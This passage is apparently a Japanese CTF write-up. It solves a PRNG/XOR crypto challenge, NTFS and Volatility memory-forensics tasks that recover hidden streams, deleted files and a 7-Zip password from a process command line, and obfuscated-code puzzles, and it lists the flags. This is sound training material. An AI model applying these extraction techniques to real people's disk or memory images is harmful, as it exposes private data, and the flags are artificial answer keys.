<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt_first_4bytes</span>(<span class="params">ciphertext, seed</span>):</span><br><span class="line">    plaintext = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">        plaintext += <span class="built_in">chr</span>(ciphertext[j] ^ ((seed &gt;&gt; (j * <span class="number">8</span>)) &amp; <span class="number">0xFF</span>))</span><br><span class="line">    <span class="keyword">return</span> plaintext</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">ciphertext, prng</span>):</span><br><span class="line">    plaintext = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(ciphertext), <span class="number">4</span>):</span><br><span class="line">        xor_val = <span class="built_in">next</span>(prng)</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">            <span class="comment"># print(f&quot;i: &#123;i&#125;, j: &#123;j&#125;, xor_val: &#123;xor_val&#125;&quot;)</span></span><br><span class="line">            <span class="keyword">if</span> i + j &lt; <span class="built_in">len</span>(ciphertext):</span><br><span class="line">                plaintext += <span class="built_in">chr</span>(ciphertext[i + j] ^ ((xor_val &gt;&gt; (j * <span class="number">8</span>)) &amp; <span class="number">0xFF</span>))</span><br><span class="line">    <span class="keyword">return</span> plaintext</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">lcg</span>(<span class="params">m=<span class="number">4294967296</span>, a=<span class="number">233</span>, c=<span class="number">653</span>, seed=<span class="number">0</span></span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Linear congruential generator&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">yield</span> seed</span><br><span class="line">        seed = (a * seed + c) % m</span><br><span class="line"></span><br><span class="line"><span class="comment"># Read the encrypted file</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;PRNG.bin&quot;</span>, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    ciphertext = f.read()</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;seedlist.hex&quot;</span>, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> seed_hex <span class="keyword">in</span> f:</span><br><span class="line">        seed = <span class="built_in">int</span>(seed_hex.strip(), <span class="number">16</span>)</span><br><span class="line">        first_4bytes = decrypt_first_4bytes(ciphertext, seed)</span><br><span class="line">        <span class="built_in">print</span>(</span><br><span class="line">            <span class="string">&quot;[progress] seed: &#123;:08X&#125;, first_4bytes: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(</span><br><span class="line">                seed, first_4bytes.encode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">            )</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">        <span class="keyword">assert</span> first_4bytes.isalpha()</span><br><span class="line"></span><br><span class="line">        prng = lcg(seed=seed)</span><br><span class="line">        plaintext = decrypt(ciphertext, prng)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;flag&quot;</span> <span class="keyword">in</span> plaintext <span class="keyword">or</span> <span class="string">&quot;FLAG&quot;</span> <span class="keyword">in</span> plaintext <span class="keyword">or</span> <span class="string">&quot;Flag&quot;</span> <span class="keyword">in</span> plaintext:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;[Hit ASCII!] seed: <span class="subst">&#123;seed&#125;</span>, plaintext: <span class="subst">&#123;plaintext&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">f&quot;decrypted-seed-<span class="subst">&#123;seed&#125;</span>.txt&quot;</span>, <span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> f2:</span><br><span class="line">                f2.write(plaintext)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>シードが10進数で 2638296720 のとき、以下の平文が得られる。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Against selection release between gray knowledge. To interest trot versus protective morning. Round death annoy on interesting bat. Inside finger zip of jolly skate. Opposite flavor exercise of husky quiet. Minus plate include despite whole development. Below society desert than kindhearted head. To shirt guarantee anti steadfast secretary. Beneath tree laugh like romantic expert. To sisters end below hallowed carriage. **flag&#123;QVFE5i5LkZdR&#125;** Inside hook point into depressed hate. Past act reply anti quarrelsome stove. Aboard badge memorize amid vagabond farm. On riddle request without offbeat pets. At mouth object above present ink. Near curve stroke in garrulous trouble. Anti country answer through swift talk. Over test escape into puzzling crook. Than stream waste near uneven ants. About fireman choke along defective base.</span><br></pre></td></tr></table></figure>

<aside>
⛳ flag{QVFE5i5LkZdR}

</aside>

<h2><span id="forensics">Forensics</span></h2><h3><span id="ntfs-data-hide">NTFS Data Hide</span></h3><img src="/img/2024/02-25/Untitled%2011.png" width="550px" height="auto">

<p>FTK Imagerを初めて使ってみたが、下手くそでうまくいかなかった 😇</p>
<p>自分メモの <a target="_blank" rel="noopener" href="https://laysakura.notion.site/CTF-forensics-bb9a10ec17134b6c86ba5cd91c4f33d1#d96978e1f5864cf9b7d15a502a6f93cd">sleuthkit 基本仕草 - Notion</a> あたりを読みつつ sleuthkit でやっていく。</p>
<hr>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">% fls -o 0000000128 NTFS.vhd</span><br><span class="line">r/r 4-128-1:    <span class="variable">$AttrDef</span></span><br><span class="line">r/r 8-128-2:    <span class="variable">$BadClus</span></span><br><span class="line">r/r 8-128-1:    <span class="variable">$BadClus</span>:<span class="variable">$Bad</span></span><br><span class="line">r/r 6-128-4:    <span class="variable">$Bitmap</span></span><br><span class="line">r/r 7-128-1:    <span class="variable">$Boot</span></span><br><span class="line">d/d 11-144-4:   <span class="variable">$Extend</span></span><br><span class="line">r/r 2-128-1:    <span class="variable">$LogFile</span></span><br><span class="line">r/r 0-128-6:    <span class="variable">$MFT</span></span><br><span class="line">r/r 1-128-1:    <span class="variable">$MFTMirr</span></span><br><span class="line">d/d 49-144-1:   <span class="variable">$RECYCLE</span>.BIN</span><br><span class="line">r/r 9-128-8:    <span class="variable">$Secure</span>:<span class="variable">$SDS</span></span><br><span class="line">r/r 9-144-11:   <span class="variable">$Secure</span>:<span class="variable">$SDH</span></span><br><span class="line">r/r 9-144-14:   <span class="variable">$Secure</span>:<span class="variable">$SII</span></span><br><span class="line">r/r 10-128-1:   <span class="variable">$UpCase</span></span><br><span class="line">r/r 10-128-4:   <span class="variable">$UpCase</span>:<span class="variable">$Info</span></span><br><span class="line">r/r 3-128-3:    <span class="variable">$Volume</span></span><br><span class="line">d/d 39-144-1:   NTFSDataHide</span><br><span class="line">d/d 41-144-1:   NTFSFileDelete</span><br><span class="line">d/d 40-144-1:   NTFSFileRename</span><br><span class="line">d/d 36-144-5:   System Volume Information</span><br><span class="line">V/V 256:        <span class="variable">$OrphanFiles</span></span><br><span class="line"></span><br><span class="line">% fls -o 0000000128 NTFS.vhd 39-144-1</span><br><span class="line">r/r 42-128-3:   Sample.pptx</span><br><span class="line">r/r 42-128-5:   Sample.pptx:script</span><br><span class="line"></span><br><span class="line">% icat -o 0000000128 -r NTFS.vhd 42-128-5</span><br><span class="line"><span class="string">&quot;[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String(&#x27;**ZmxhZ3tkYXRhX2Nhbl9iZV9oaWRkZW5faW5fYWRzfQ==**&#x27;))&quot;</span></span><br></pre></td></tr></table></figure>

<p>Base64が出てきたのでCyberChef。</p>
<img src="/img/2024/02-25/Untitled%2012.png" width="auto" height="auto">

<aside>
⛳ flag{data_can_be_hidden_in_ads}

</aside>

<h3><span id="ntfs-file-delete">NTFS File Delete</span></h3><img src="/img/2024/02-25/Untitled%2013.png" width="550px" height="auto">

<p>前問と同様に sleuthkit で。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">% fls -o 0000000128 NTFS.vhd</span><br><span class="line">r/r 4-128-1:    <span class="variable">$AttrDef</span></span><br><span class="line">r/r 8-128-2:    <span class="variable">$BadClus</span></span><br><span class="line">r/r 8-128-1:    <span class="variable">$BadClus</span>:<span class="variable">$Bad</span></span><br><span class="line">r/r 6-128-4:    <span class="variable">$Bitmap</span></span><br><span class="line">r/r 7-128-1:    <span class="variable">$Boot</span></span><br><span class="line">d/d 11-144-4:   <span class="variable">$Extend</span></span><br><span class="line">r/r 2-128-1:    <span class="variable">$LogFile</span></span><br><span class="line">r/r 0-128-6:    <span class="variable">$MFT</span></span><br><span class="line">r/r 1-128-1:    <span class="variable">$MFTMirr</span></span><br><span class="line">d/d 49-144-1:   <span class="variable">$RECYCLE</span>.BIN</span><br><span class="line">r/r 9-128-8:    <span class="variable">$Secure</span>:<span class="variable">$SDS</span></span><br><span class="line">r/r 9-144-11:   <span class="variable">$Secure</span>:<span class="variable">$SDH</span></span><br><span class="line">r/r 9-144-14:   <span class="variable">$Secure</span>:<span class="variable">$SII</span></span><br><span class="line">r/r 10-128-1:   <span class="variable">$UpCase</span></span><br><span class="line">r/r 10-128-4:   <span class="variable">$UpCase</span>:<span class="variable">$Info</span></span><br><span class="line">r/r 3-128-3:    <span class="variable">$Volume</span></span><br><span class="line">d/d 39-144-1:   NTFSDataHide</span><br><span class="line">d/d 41-144-1:   NTFSFileDelete</span><br><span class="line">d/d 40-144-1:   NTFSFileRename</span><br><span class="line">d/d 36-144-5:   System Volume Information</span><br><span class="line">V/V 256:        <span class="variable">$OrphanFiles</span></span><br><span class="line"></span><br><span class="line">% fls -o 0000000128 NTFS.vhd 41-144-1</span><br><span class="line">r/r 48-128-1:   Sample.txt</span><br><span class="line">-/r * 52-128-1: flag.txt</span><br><span class="line"></span><br><span class="line">% icat -o 0000000128 -r NTFS.vhd 52-128-1</span><br><span class="line">**flag&#123;resident_in_mft&#125;**</span><br></pre></td></tr></table></figure>

<aside>
⛳ flag{resident_in_mft}

</aside>

<h3><span id="ntfs-file-rename">NTFS File Rename</span></h3><img src="/img/2024/02-25/Untitled%2014.png" width="550px" height="auto">

<p><code>$MFT</code> から履歴辿ろうと思ったけどファイル名わからなかった。ヒント見た。</p>
<blockquote>
<p>NTFS ファイルシステムはジャーナリングファイルシステムで、<strong>NTFS Log</strong> や USN ジャーナルにファイルの変更履歴が記録されています。</p>
</blockquote>
<p>sleuthkit で <code>$LogFile</code> をゲット。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">% fls -o 0000000128 NTFS.vhd</span><br><span class="line">r/r 4-128-1:    <span class="variable">$AttrDef</span></span><br><span class="line">r/r 8-128-2:    <span class="variable">$BadClus</span></span><br><span class="line">r/r 8-128-1:    <span class="variable">$BadClus</span>:<span class="variable">$Bad</span></span><br><span class="line">r/r 6-128-4:    <span class="variable">$Bitmap</span></span><br><span class="line">r/r 7-128-1:    <span class="variable">$Boot</span></span><br><span class="line">d/d 11-144-4:   <span class="variable">$Extend</span></span><br><span class="line">r/r 2-128-1:    <span class="variable">$LogFile</span></span><br><span class="line">r/r 0-128-6:    <span class="variable">$MFT</span></span><br><span class="line">r/r 1-128-1:    <span class="variable">$MFTMirr</span></span><br><span class="line">d/d 49-144-1:   <span class="variable">$RECYCLE</span>.BIN</span><br><span class="line">r/r 9-128-8:    <span class="variable">$Secure</span>:<span class="variable">$SDS</span></span><br><span class="line">r/r 9-144-11:   <span class="variable">$Secure</span>:<span class="variable">$SDH</span></span><br><span class="line">r/r 9-144-14:   <span class="variable">$Secure</span>:<span class="variable">$SII</span></span><br><span class="line">r/r 10-128-1:   <span class="variable">$UpCase</span></span><br><span class="line">r/r 10-128-4:   <span class="variable">$UpCase</span>:<span class="variable">$Info</span></span><br><span class="line">r/r 3-128-3:    <span class="variable">$Volume</span></span><br><span class="line">d/d 39-144-1:   NTFSDataHide</span><br><span class="line">d/d 41-144-1:   NTFSFileDelete</span><br><span class="line">d/d 40-144-1:   NTFSFileRename</span><br><span class="line">d/d 36-144-5:   System Volume Information</span><br><span class="line">V/V 256:        <span class="variable">$OrphanFiles</span></span><br><span class="line"></span><br><span class="line">% icat -o 0000000128 -r NTFS.vhd 2-128-1 &gt; LogFile</span><br></pre></td></tr></table></figure>

<p>Windowsのファイルにありがちな2バイトエンコーディングに気をつけつつ strings でチェック。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">% strings -e l LogFile |grep docx</span><br><span class="line">werful.docx</span><br><span class="line"><span class="string">&quot;**journaling_system_is_powerful.docx**</span></span><br><span class="line"><span class="string">owerful.docx</span></span><br><span class="line"><span class="string">&quot;</span>journaling_system_is_powerful.docx</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<aside>
⛳ flag{journaling_system_is_powerful}

</aside>

<h3><span id="hidden-variable">HiddEN Variable</span></h3><img src="/img/2024/02-25/Untitled%2015.png" width="550px" height="auto">

<p>メモリフォレンジック！初めてなんだよなぁ…</p>
<p>タイトルからして環境変数を見たそう。ググると Volatility とかいうのを使うと良いとか。本当は2とか3の使い方で滅茶苦茶苦労したけど、サラッと要点を書く。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">% vol.py -f ~/tmp/forensics/memdump.raw windows.envars.Envars &gt; Envars.txt</span><br><span class="line"></span><br><span class="line">% ag flag</span><br><span class="line">Envars.txt</span><br><span class="line">1298:2816       sihost.exe      0x1747e0e2010   FLAG    **BDkPUNzMM3VHthkj2cVEjdRBqTJcfLMJaxT9si67RgJZ45PS**</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p><code>flag&#123;BDkPUNzMM3VHthkj2cVEjdRBqTJcfLMJaxT9si67RgJZ45PS&#125;</code> かな？ﾖｼ! と思ったけど通らない。ここで試行錯誤沼にハマり30分以上損したが、CyberChefに入れたら教えてくれた。</p>
<img src="/img/2024/02-25/Untitled%2016.png" width="auto" height="auto">

<p>悔し〜〜〜〜〜〜〜〜〜〜</p>
<aside>
⛳ flag{volatile_environment_variable}

</aside>

<h3><span id="my-secret">My Secret</span></h3><img src="/img/2024/02-25/Untitled%2017.png" width="550px" height="auto">

<p>取っ掛かりがあまりない &amp; 残り時間も少なくなってきていたのでヒントを見た。</p>
<blockquote>
<p>7-Zip というソフトウェアで何かを行っているようです。</p>
</blockquote>
<p>じゃあプロセス絞って解析だな。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">% vol.py -f ~/tmp/forensics/memdump.raw windows.pslist &gt; pslist.txt</span><br><span class="line"></span><br><span class="line">% grep <span class="string">&#x27;7z&#x27;</span> pslist.txt</span><br><span class="line">**5516**    3468    7z.exe  0xe206bb303080  4       -       1       False   2023-12-26 00:51:23.000000      N/A     Disabled</span><br><span class="line"><span class="comment"># PIDが5516</span></span><br><span class="line"></span><br><span class="line">% vol.py -f ~/tmp/forensics/memdump.raw windows.cmdline --pid 5516</span><br><span class="line">Volatility 3 Framework 2.6.1</span><br><span class="line">Progress:  100.00               PDB scanning finished</span><br><span class="line">PID     Process Args</span><br><span class="line"></span><br><span class="line">5516    7z.exe  7z  x -p**Y0uCanF1ndTh1sPa$<span class="variable">$w0rd</span>** C:\Users\vauser\Documents\**Secrets.7z** -<span class="built_in">od</span>:\</span><br><span class="line"></span><br><span class="line">% vol.py -f ~/tmp/forensics/memdump.raw -o .  windows.dumpfiles --pid 5516</span><br><span class="line">Volatility 3 Framework 2.6.1</span><br><span class="line">Progress:  100.00               PDB scanning finished</span><br><span class="line">Cache   FileObject      FileName        Result</span><br><span class="line"></span><br><span class="line">DataSectionObject       0xe206bbc4a2f0  Secrets.7z      Error dumping file</span><br><span class="line">SharedCacheMap  0xe206bbc4a2f0  **Secrets.7z**      file.0xe206bbc4a2f0.0xe206bbabada0.SharedCacheMap.Secrets.7z.vacb</span><br></pre></td></tr></table></figure>

<p>材料は揃ったっぽいので展開。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">% 7z x -p<span class="string">&#x27;Y0uCanF1ndTh1sPa$$w0rd&#x27;</span> file.0xe206bbc4a2f0.0xe206bbabada0.SharedCacheMap.Secrets.7z.vacb</span><br></pre></td></tr></table></figure>

<p><code>Secrets.rtf</code> というファイルができるので開くと、、フラグがない…</p>
<p>ないわけないでしょ、リッチテキストってことは反転でしょ</p>
<img src="/img/2024/02-25/Untitled%2018.png" width="auto" height="auto">

<p>いた…</p>
<aside>
⛳ flag{you_cannot_find_this_secret!}

</aside>

<h2><span id="miscellaneous">Miscellaneous</span></h2><h3><span id="une-maison">Une Maison</span></h3><img src="/img/2024/02-25/Untitled%2019.png" width="550px" height="auto">

<p>添付画像は↓</p>
<img src="/img/2024/02-25/Untitled%2020.png" width="auto" height="auto">

<p>バーコードっぽい…？</p>
<p><a target="_blank" rel="noopener" href="https://www.aperisolve.com/">Aperi’Solve</a></p>
<p>で色味を落としたやつを適当なAndroidアプリのバーコードリーダーで読んだら、読めた。</p>
<aside>
⛳ flag{$50M!}

</aside>

<h3><span id="string-obfuscation">String Obfuscation</span></h3><img src="/img/2024/02-25/Untitled%2021.png" width="550px" height="auto">

<p>添付コードはこれ。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) &lt; <span class="number">2</span>:</span><br><span class="line">    exit()</span><br><span class="line"></span><br><span class="line">KEY = <span class="string">&quot;gobbledygook&quot;</span>.replace(<span class="string">&quot;b&quot;</span>, <span class="string">&quot;&quot;</span>).replace(<span class="string">&quot;e&quot;</span>, <span class="string">&quot;&quot;</span>).replace(<span class="string">&quot;oo&quot;</span>, <span class="string">&quot;&quot;</span>).replace(<span class="string">&quot;gk&quot;</span>, <span class="string">&quot;&quot;</span>).replace(<span class="string">&quot;y&quot;</span>, <span class="string">&quot;en&quot;</span>)</span><br><span class="line">**FLAG = <span class="built_in">chr</span>(<span class="number">51</span>)+<span class="built_in">chr</span>(<span class="number">70</span>)+<span class="built_in">chr</span>(<span class="number">120</span>)+<span class="built_in">chr</span>(<span class="number">89</span>)+<span class="built_in">chr</span>(<span class="number">70</span>)+<span class="built_in">chr</span>(<span class="number">109</span>)+<span class="built_in">chr</span>(<span class="number">52</span>)+<span class="built_in">chr</span>(<span class="number">117</span>)+<span class="built_in">chr</span>(<span class="number">84</span>)+<span class="built_in">chr</span>(<span class="number">89</span>)+<span class="built_in">chr</span>(<span class="number">68</span>)+<span class="built_in">chr</span>(<span class="number">70</span>)+<span class="built_in">chr</span>(<span class="number">70</span>)+<span class="built_in">chr</span>(<span class="number">122</span>)+<span class="built_in">chr</span>(<span class="number">109</span>)+<span class="built_in">chr</span>(<span class="number">98</span>)+<span class="built_in">chr</span>(<span class="number">51</span>)**</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> sys.argv[<span class="number">1</span>] == KEY:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;flag&#123;%s&#125;&quot;</span> % FLAG)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><code>FLAG</code> の箇所を普通に評価すればOK。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">% python</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">chr</span>(<span class="number">51</span>)+<span class="built_in">chr</span>(<span class="number">70</span>)+<span class="built_in">chr</span>(<span class="number">120</span>)+<span class="built_in">chr</span>(<span class="number">89</span>)+<span class="built_in">chr</span>(<span class="number">70</span>)+<span class="built_in">chr</span>(<span class="number">109</span>)+<span class="built_in">chr</span>(<span class="number">52</span>)+<span class="built_in">chr</span>(<span class="number">117</span>)+<span class="built_in">chr</span>(<span class="number">84</span>)+<span class="built_in">chr</span>(<span class="number">89</span>)+<span class="built_in">chr</span>(<span class="number">68</span>)+<span class="built_in">chr</span>(<span class="number">70</span>)+<span class="built_in">chr</span>(<span class="number">70</span>)+<span class="built_in">chr</span>(<span class="number">122</span>)+<span class="built_in">chr</span>(<span class="number">109</span>)+<span class="built_in">chr</span>(<span class="number">98</span>)+<span class="built_in">chr</span>(<span class="number">51</span>)</span><br><span class="line"><span class="string">&#x27;3FxYFm4uTYDFFzmb3&#x27;</span></span><br></pre></td></tr></table></figure>

<aside>
⛳ flag{3FxYFm4uTYDFFzmb3}

</aside>

<h3><span id="where-is-the-legit-flag">Where Is the Legit Flag?</span></h3><img src="/img/2024/02-25/Untitled%2022.png" width="550px" height="auto">

<p>コードはこれ。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="built_in">exec</span>(<span class="built_in">chr</span>(<span class="number">105</span>)+<span class="built_in">chr</span>(<span class="number">109</span>)+<span class="built_in">chr</span>(<span class="number">112</span>)+<span class="built_in">chr</span>(<span class="number">111</span>)+<span class="built_in">chr</span>(<span class="number">114</span>)+<span class="built_in">chr</span>(<span class="number">116</span>)+<span class="built_in">chr</span>(<span class="number">32</span>)+<span class="built_in">chr</span>(<span class="number">122</span>)+<span class="built_in">chr</span>(<span class="number">108</span>)+<span class="built_in">chr</span>(<span class="number">105</span>)+<span class="built_in">chr</span>(<span class="number">98</span>)+<span class="built_in">chr</span>(<span class="number">44</span>)+<span class="built_in">chr</span>(<span class="number">32</span>)+<span class="built_in">chr</span>(<span class="number">98</span>)+<span class="built_in">chr</span>(<span class="number">97</span>)+<span class="built_in">chr</span>(<span class="number">115</span>)+<span class="built_in">chr</span>(<span class="number">101</span>)+<span class="built_in">chr</span>(<span class="number">54</span>)+<span class="built_in">chr</span>(<span class="number">52</span>))</span><br><span class="line">**TANAKA = <span class="string">&quot;eJyNVG1320QT/Z5z8h+GhNYvcR35JZZdaCGhT6D0gQTiFKjjlpU0ljZe7272xYpoy2/vrJRA+MA56IOPrJ29e+feO7sP84JJ2CohsEqYELBlktsCWM64tA6E3+gKEjSm6u/uXBzPz+AZtBY/vRx91Unffv908vOrw9PXz7/E23h/nf2mtp9/Gz05fn9zbv8sB18f/P7DWa9o/5/1f/Hf6KMlhzfJ9YvZ/x4NKzk185PNF6vud3uf/Xjx0eV/PLsUvz4ev/tw1bq6au3u7MNxorYIK5Yi4K0WRAhWyoAuKstTJiDDlFuuZB9C9WvOwEq2RpBsg2CUlxk4Is5XPIXEMGubwlNqVpVc5mB9nqN1BAG2LjeYM5OFpRVumCAUTPF+31yVtAhb+oB0OLcsN4ikjUTmCih8jqCVoSODUpdvLl+9JK0W8fhJdBD1dnfg7pnG3UGPS9ceT7vdQYdW9uFstQLtjVYWQTBiwiwYb6hJ65jDDUpHoPcIYfP03ahTo4yG/Sg8zb/WaNwKkPel8QQeQ3R7etqLh/CB3qKoF8/gbfO2mBwtF9GypvDCm9D4WipHbYsKLCP1S4MuLTADmzISw6gyiHGP3h52euMY+ArmxpNLguhHNY/B8JBaG0TwCAaDnjJZOy1MezjpPCQ3ig6O7pQ4HHYJa9adLQMXOBfeglMIFp0jH0pOCm8ZBZJSialrHIGLQJECnFmwBQqSvqk0zLkKtFGZT5GEo9Iz7yzPSF3MLUhynYw0NpximLzxXISmWchCU39soWRiDZqRHE04eF64lRfAsi0n2JrCCdaomlXBowBGKU0qMtFQHNYYpmYfzgPzBAu25SHAiv65Jk1esoT6K9TmDhCON4psoLhT7FO1aXKfKhnOqR3ykjwq6Zs3pslFG8K+hqXVzKzJLWVSmuJ6gqxWQY7cMF0fEqRvtWjLpSTIJr3XWFKo00Jp6oXoZaiRVqklmh8RNAy7+uHnWhGhf33ai7/9DQ5xWfeRlJiA4wiKkl544yjYoZu7S2XBl38h/Ldd4SbglAZoJu3hoRRHDs9hHA+nT/9Bhp7EIFs//OhoRoej8WQSQxemo3h69HBV02mu7Q5H46M4no46tUPzgqTOC7jxiBIytiF6YAXXGk1Ve8YMt3WQls2OkyqEKQyzUXRBhYwqT83QQKGjJVtQbVN6pike3CFUoVIijV7SZMx6wk/CjUzXcfCxIbe3Eip/P91e46z0MtGz6fjjHmHt7nwCLpe/Qg==&quot;</span>**</span><br><span class="line">TAKAHASHI = [<span class="number">0x7a</span>,<span class="number">0x7a</span>,<span class="number">0x7a</span>,<span class="number">0x12</span>,<span class="number">0x18</span>,<span class="number">0x12</span>,<span class="number">0x1d</span>,<span class="number">0x12</span>,<span class="number">0x07</span>,<span class="number">0x7b</span>,<span class="number">0x36</span>,<span class="number">0x37</span>,<span class="number">0x3c</span>,<span class="number">0x30</span>,<span class="number">0x36</span>,<span class="number">0x37</span>,<span class="number">0x67</span>,<span class="number">0x65</span>,<span class="number">0x31</span>,<span class="number">0x7d</span>,<span class="number">0x67</span>,<span class="number">0x65</span>,<span class="number">0x36</span>,<span class="number">0x20</span>,<span class="number">0x32</span>,<span class="number">0x31</span>,<span class="number">0x7b</span>,<span class="number">0x20</span>,<span class="number">0x20</span>,<span class="number">0x36</span>,<span class="number">0x21</span>,<span class="number">0x23</span>,<span class="number">0x3e</span>,<span class="number">0x3c</span>,<span class="number">0x30</span>,<span class="number">0x36</span>,<span class="number">0x37</span>,<span class="number">0x7d</span>,<span class="number">0x31</span>,<span 